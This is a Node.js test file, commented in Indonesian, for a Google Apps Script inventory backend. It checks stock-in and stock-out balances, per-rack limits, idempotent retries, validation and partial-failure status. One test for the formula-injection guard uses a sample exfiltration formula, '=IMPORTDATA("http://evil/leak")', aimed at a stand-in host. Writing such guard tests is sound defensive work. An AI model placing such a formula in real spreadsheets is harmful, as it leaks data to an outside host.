/* L1 gs_trx_exec — MENGEKSEKUSI postTransaksi() sungguhan dari Code.gs lewat harness gs_harness.
 * Celah yang ditutup: sebelumnya tidak ada test backend eksekutabel sama sekali —
 * "stock integrity" hanya simulasi model sendiri yang tidak membaca file produksi.
 * Skenario (dapur sungguhan: Master_Item + Transaksi_Log + Stok_Saldo + Stok_Per_Rak):
 *   - MASUK menambah saldo total & saldo per rak
 *   - KELUAR mengurangi, dan DITOLAK bila melebihi saldo RAK (bukan saldo total)
 *   - idempotensi requestId: retry dengan requestId sama tidak menghasilkan transaksi ganda
 *   - KELUAR pada item Arsip ditolak
 *   - qty/jenis/rak tidak valid ditolak
 *   - partial: bila updateSaldo gagal → status partial + saldoSyncOk=false
 * CATATAN LEVEL: L1 deterministik (offline). Tidak menguji race GAS sungguhan / LockService asli. */
const path = require('path');
const { loadCodeGS, makeSpreadsheet, makeSheet } = require('../tools/gs_harness.js');

let pass = 0, fail = 0;
function t(name, cond, detail) {
  if (cond) { pass++; console.log('PASS | ' + name + (detail ? ' | ' + detail : '')); }
  else { fail++; console.log('FAIL | ' + name + (detail ? ' | ' + detail : '')); }
}

/* Bangun spreadsheet dapur sungguhan dengan header sesuai COL_* Code.gs */
function buildKitchen(opts) {
  const o = opts || {};
  const master = makeSheet('Master_Item', [
    ['No', 'ID_Item', 'Nama Material', 'Spesifikasi', 'User/Dept', 'BC/Non BC', 'Unit', 'Kategori', 'Min_Stock', 'Status'],
    [1, 'MRO-01', 'Bearing 6205', 'Bearing industri', 'Gudang', 'BC', 'Pcs', 'Sparepart', 10, o.arsip ? 'Arsip' : 'Aktif'],
    [2, 'MRO-02', 'V-Belt B50', 'Timing belt', 'Gudang', 'NON BC', 'Pcs', 'Consumable', 5, 'Aktif'],
  ]);
  const trx = makeSheet('Transaksi_Log', [
    ['Timestamp', 'ID_Item', 'Nama_Item', 'Spesifikasi', 'Jenis', 'Qty', 'RAK', 'Vendor', 'No_Referensi', 'Saldo_Sebelum', 'Saldo_Sesudah', 'Keterangan', 'Admin'],
  ]);
  const saldo = makeSheet('Stok_Saldo', [
    ['ID_Item', 'Nama', 'Unit', 'Total_Masuk', 'Total_Keluar', 'Saldo_Akhir'],
  ]);
  const rak = makeSheet('Stok_Per_Rak', [
    ['ID_Item', 'RAK', 'Qty'],
  ]);
  return makeSpreadsheet([master, trx, saldo, rak]);
}

function ctxFor(kitchen, props) {
  return loadCodeGS({ spreadsheet: kitchen, props: Object.assign({ EDITOR_KEY: 'TEST-EDITOR-KEY', VIEWER_TOKEN_SECRET: 'test-token-secret' }, props || {}) });
}
function trxCount(kit) { return kit.getSheetByName('Transaksi_Log').getLastRow() - 1; }
function saldoOf(kit, id) {
  const sh = kit.getSheetByName('Stok_Saldo');
  const v = sh.getRange(2, 1, Math.max(0, sh.getLastRow() - 1), 6).getValues();
  const row = v.find(r => String(r[0]) === id);
  return row ? { masuk: row[3], keluar: row[4], saldo: row[5] } : null;
}
function rakOf(kit, id) {
  const sh = kit.getSheetByName('Stok_Per_Rak');
  const v = sh.getRange(2, 1, Math.max(0, sh.getLastRow() - 1), 3).getValues();
  const row = v.find(r => String(r[0]) === id);
  return row ? { rak: row[1], qty: row[2] } : null;
}

/* ---------- 1. MASUK: saldo total & per rak naik ---------- */
(function () {
  const kit = buildKitchen();
  const ctx = ctxFor(kit);
  const res = ctx.postTransaksi({ itemId: 'MRO-01', jenis: 'MASUK', qty: 20, rak: 'A-01', vendor: 'PT V1', noReferensi: 'SJ-1', keterangan: 'penerimaan', admin: 'budi', requestId: 'rid-in-1' });
  t('MASUK berhasil (status ok)', res && res.status === 'ok', JSON.stringify(res));
  t('MASUK → Stok_Saldo 120/0/20', JSON.stringify(saldoOf(kit, 'MRO-01')) === JSON.stringify({ masuk: 20, keluar: 0, saldo: 20 }), JSON.stringify(saldoOf(kit, 'MRO-01')));
  t('MASUK → Stok_Per_Rak A-01 = 20', JSON.stringify(rakOf(kit, 'MRO-01')) === JSON.stringify({ rak: 'A-01', qty: 20 }), JSON.stringify(rakOf(kit, 'MRO-01')));
  t('MASUK → 1 baris Transaksi_Log', trxCount(kit) === 1, 'baris=' + trxCount(kit));
  const row = kit.getSheetByName('Transaksi_Log').getRange(2, 1, 1, 13).getValues()[0];
  t('Transaksi_Log: vendor & No_Referensi per transaksi (bukan nempel di master)', row[7] === 'PT V1' && row[8] === 'SJ-1', 'vendor=' + row[7] + ' noRef=' + row[8]);
  t('Transaksi_Log: Saldo_Sebelum/Sesudah terisi', row[9] === 0 && row[10] === 20, 'sebelum=' + row[9] + ' sesudah=' + row[10]);
})();

/* ---------- 2. KELUAR: saldo turun, per-rak ikut ---------- */
(function () {
  const kit = buildKitchen();
  const ctx = ctxFor(kit);
  ctx.postTransaksi({ itemId: 'MRO-01', jenis: 'MASUK', qty: 20, rak: 'A-01', admin: 'budi', requestId: 'r-in' });
  const res = ctx.postTransaksi({ itemId: 'MRO-01', jenis: 'KELUAR', qty: 5, rak: 'A-01', admin: 'budi', requestId: 'r-out' });
  t('KELUAR berhasil', res && res.status === 'ok', JSON.stringify(res));
  t('KELUAR → Stok_Saldo 20/5/15', JSON.stringify(saldoOf(kit, 'MRO-01')) === JSON.stringify({ masuk: 20, keluar: 5, saldo: 15 }), JSON.stringify(saldoOf(kit, 'MRO-01')));
  t('KELUAR → Stok_Per_Rak A-01 = 15', JSON.stringify(rakOf(kit, 'MRO-01')) === JSON.stringify({ rak: 'A-01', qty: 15 }), JSON.stringify(rakOf(kit, 'MRO-01')));
})();

/* ---------- 3. KELUAR melebihi saldo RAK ditolak (termasuk saat saldo total cukup) ---------- */
(function () {
  const kit = buildKitchen();
  const ctx = ctxFor(kit);
  ctx.postTransaksi({ itemId: 'MRO-01', jenis: 'MASUK', qty: 20, rak: 'A-01', admin: 'b', requestId: 'r1' });
  ctx.postTransaksi({ itemId: 'MRO-01', jenis: 'MASUK', qty: 30, rak: 'B-01', admin: 'b', requestId: 'r2' });
  const res = ctx.postTransaksi({ itemId: 'MRO-01', jenis: 'KELUAR', qty: 25, rak: 'A-01', admin: 'b', requestId: 'r3' });
  t('KELUAR > saldo rak DITOLAK (meski saldo total cukup 50)', res && res.status === 'error' && /rak|Rak|RAK|saldo/i.test(res.message || ''), JSON.stringify(res));
  t('penolakan tidak mengubah saldo rak A-01 (tetap 20)', JSON.stringify(rakOf(kit, 'MRO-01')) === JSON.stringify({ rak: 'A-01', qty: 20 }), JSON.stringify(rakOf(kit, 'MRO-01')));
  t('penolakan tidak menambah Transaksi_Log', trxCount(kit) === 2, 'baris=' + trxCount(kit));
})();

/* ---------- 4. IDEMPOTENSI: retry requestId sama = tidak dobel ---------- */
(function () {
  const kit = buildKitchen();
  const ctx = ctxFor(kit);
  const p = { itemId: 'MRO-02', jenis: 'MASUK', qty: 7, rak: 'A-02', admin: 'b', requestId: 'idem-1' };
  const a = ctx.postTransaksi(Object.assign({}, p));
  const b = ctx.postTransaksi(Object.assign({}, p)); // retry persis sama
  const c = ctx.postTransaksi(Object.assign({}, p, { qty: 9 })); // retry dengan body BERBEDA → HARUS jadi transaksi baru
  t('retry requestId sama tidak menambah Transaksi_Log', trxCount(kit) === 2, 'baris=' + trxCount(kit) + ' (1 unik + 1 body-berbeda)');
  t('retry sama mengembalikan hasil konsisten (status ok)', a.status === 'ok' && b.status === 'ok', 'a=' + a.status + ' b=' + b.status);
  t('requestId sama + body BERBEDA = transaksi terpisah (body signature)', c.status === 'ok', 'c=' + c.status);
  const s = saldoOf(kit, 'MRO-02');
  t('saldo MRO-02 = 7 + 9 (bukan 7*3)', s && s.saldo === 16, JSON.stringify(s));
})();

/* ---------- 5. Item ARSIP ditolak ---------- */
(function () {
  const kit = buildKitchen({ arsip: true });
  const ctx = ctxFor(kit);
  const res = ctx.postTransaksi({ itemId: 'MRO-01', jenis: 'MASUK', qty: 5, rak: 'A-01', admin: 'b', requestId: 'ar' });
  t('item Arsip DITOLAK untuk MASUK', res && res.status === 'error' && /arsip/i.test(res.message || ''), JSON.stringify(res));
  t('item Arsip tidak masuk Transaksi_Log', trxCount(kit) === 0, 'baris=' + trxCount(kit));
})();

/* ---------- 6. Validasi input ---------- */
(function () {
  const kit = buildKitchen();
  const ctx = ctxFor(kit);
  const bad = [
    ['qty 0', { itemId: 'MRO-01', jenis: 'MASUK', qty: 0, rak: 'A-01', admin: 'b', requestId: 'v1' }],
    ['qty negatif', { itemId: 'MRO-01', jenis: 'MASUK', qty: -5, rak: 'A-01', admin: 'b', requestId: 'v2' }],
    ['jenis ngawur', { itemId: 'MRO-01', jenis: 'PINJAM', qty: 5, rak: 'A-01', admin: 'b', requestId: 'v3' }],
    ['rak kosong', { itemId: 'MRO-01', jenis: 'MASUK', qty: 5, rak: '', admin: 'b', requestId: 'v4' }],
    ['item tak ada', { itemId: 'TIDAK-ADA', jenis: 'MASUK', qty: 5, rak: 'A-01', admin: 'b', requestId: 'v5' }],
  ];
  bad.forEach(([label, p]) => {
    const res = ctx.postTransaksi(p);
    t('validasi menolak: ' + label, res && res.status === 'error', JSON.stringify(res).slice(0, 90));
  });
  t('tidak ada transaksi tertulis dari input invalid', trxCount(kit) === 0, 'baris=' + trxCount(kit));
})();

/* ---------- 7. safeCell_ (formula-injection guard) ---------- */
(function () {
  const ctx = ctxFor(buildKitchen());
  const evil = '=IMPORTDATA("http://evil/leak")';
  const safe = ctx.safeCell_(evil);
  t('safeCell_ menetralkan formula (=) → prefix kutip', typeof safe === 'string' && safe.charAt(0) === "'" && safe.indexOf('IMPORTDATA') > 0, JSON.stringify(safe));
  t('safeCell_ tidak mengubah teks biasa', ctx.safeCell_('Bearing 6205') === 'Bearing 6205', JSON.stringify(ctx.safeCell_('Bearing 6205')));
  t('safeCell_ menetralkan + - @ \t', ['+1', '-1', '@SUM', '\tx'].every(v => String(ctx.safeCell_(v)).charAt(0) === "'"), 'plus/minus/at/tab');
})();

/* ---------- 8. partial: updateSaldo gagal → status partial, bukan ok ---------- */
(function () {
  const kit = buildKitchen();
  const ctx = ctxFor(kit);
  // sengaja hapus sheet Stok_Saldo supaya updateSaldo gagal → harus jadi partial, tidak 'ok' diam-diam
  const idx = kit._sheets.findIndex(s => s._name === 'Stok_Saldo');
  const removed = kit._sheets.splice(idx, 1)[0];
  delete kit._byName['Stok_Saldo'];
  const res = ctx.postTransaksi({ itemId: 'MRO-01', jenis: 'MASUK', qty: 10, rak: 'A-01', admin: 'b', requestId: 'part-1' });
  kit._sheets.splice(idx, 0, removed); kit._byName['Stok_Saldo'] = removed;
  t('kegagalan sinkron saldo → status partial (BUKAN ok)', res && res.status === 'partial', 'status=' + (res && res.status) + ' msg=' + String(res && res.message || '').slice(0, 70));
  t('partial menyertakan saldoSyncOk=false', res && res.saldoSyncOk === false, JSON.stringify({ saldoSyncOk: res && res.saldoSyncOk }));
  t('transaksi tetap tercatat di Transaksi_Log (appendRow tidak di-rollback)', trxCount(kit) === 1, 'baris=' + trxCount(kit));
})();

console.log('---- gs_trx_exec: ' + pass + ' PASS / ' + fail + ' FAIL ----');
process.exit(fail ? 1 : 0);
